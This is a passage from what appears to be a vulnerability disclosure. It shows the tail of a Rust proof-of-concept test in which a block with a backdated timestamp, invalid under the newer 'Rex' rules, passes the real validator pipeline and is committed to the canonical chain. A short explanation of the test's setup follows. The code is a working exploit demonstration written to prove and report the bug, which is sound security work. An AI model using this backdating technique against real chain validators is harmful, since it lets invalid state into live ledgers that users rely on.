    assert!(rex.is_err(), "Rex (honest) must REJECT the same block, but it validated");
    println!("standalone validate_block: MiniRex=Ok, Rex=Err({:?})", rex.unwrap_err());

    // 7. set the ValidatorDB anchor to the synthetic parent (N-1).
    let anchor = BlockMeta { block_number: BLOCK_NUMBER - 1, block_hash: parent_hash, post_state_root: B256::from(pre_root), post_withdrawals_root: EMPTY_ROOT_HASH };
    ChainStore::reset_to_anchor(&db, &anchor).unwrap();
    let db = Arc::new(db);
    let contract_cache = Arc::new(ContractCache::new(Arc::clone(&db) as Arc<dyn ContractStore>));

    // 8. stand up the mock node and drive the real pipeline.
    let state = MockState { block: block.clone(), block_number: BLOCK_NUMBER, block_hash, salt_witness: salt_witness.clone(), mpt_witness: mpt_witness.clone(), code_hash, code_bytes: bytecode.original_bytes() };
    let (handle, url) = setup_mock_rpc_server(state).await;

    // RpcClient::new uses the validator's default config: block verification is ON, so the block
    // must (and does) pass verify_block_integrity. This is the full production fetch path.
    let client = Arc::new(RpcClient::new(&[url.as_str()], &[url.as_str()]).unwrap());
    let chain_spec = Arc::new(chain_spec);

    let mut cfg = PipelineConfig::default();
    cfg.concurrent_workers = 1;
    cfg.sync_target = Some(BLOCK_NUMBER);
    let config = Arc::new(cfg);

    let shutdown = CancellationToken::new();
    let fetcher = Arc::new(ValidatorFetcher { rpc_client: client.clone(), on_remote_height: |_| {} });
    let processor = Arc::new(ValidatorProcessor { chain_spec, contract_cache, rpc_client: client });
    let hooks = Arc::new(ValidatorHooks);

    tokio::time::timeout(
        Duration::from_secs(120),
        run_pipeline(fetcher, Arc::clone(&db), processor, hooks, config, shutdown, BisectResolver),
    )
    .await
    .expect("pipeline did not finish within 120s")
    .expect("run_pipeline returned an error");

    // 9. THE PROOF: the invalid block is on the persistent canonical chain.
    let tip = db.get_canonical_tip().unwrap().expect("canonical tip must exist after the pipeline ran");
    assert_eq!(tip.block_number, BLOCK_NUMBER, "validator DB tip must have advanced to the malicious block height");
    assert_eq!(tip.block_hash, block_hash, "canonical tip hash must equal the malicious block hash");
    let committed = ChainStore::get_block_hash(&*db, BLOCK_NUMBER).unwrap();
    assert_eq!(committed, Some(block_hash), "CANONICAL_CHAIN[{BLOCK_NUMBER}] must hold the malicious block hash");

    println!(
        "\nFULL-PIPELINE accept-and-commit-invalid PROVEN:\n  \
         the real RpcClient + run_pipeline + ValidatorProcessor + ValidatorDB advanced an \
         invalid-under-Rex block\n  (single tx grows state by {N_SLOTS} slots, unlimited only \
         under the backdated MiniRex ts={ATTACKER_TS})\n  onto the persistent canonical chain: \
         CANONICAL_CHAIN[{BLOCK_NUMBER}] = {block_hash}",
    );
    handle.stop().unwrap();
}
```

### A note on the setup

Two small things in the PoC are conveniences, not part of the bug. The state root in the header is filled in by asking `validate_block` what it recomputes (the value an honest sequencer would publish for that execution) rather than reimplementing the SALT root math in the test. And the pre-state is a minimal synthetic state (one funded EOA plus one contract) built directly in a `salt::MemStore`, which is enough for MiniRex/Rex execution without the full genesis system contracts. Neither affects the result: the transaction is really signed and recovers to the sender, the witness really verifies against the pre-state root, the block really passes `verify_block_integrity`, and the block is really written to the on-disk canonical chain by the real pipeline. Swap in a real sequencer state and the same backdating works the same way.
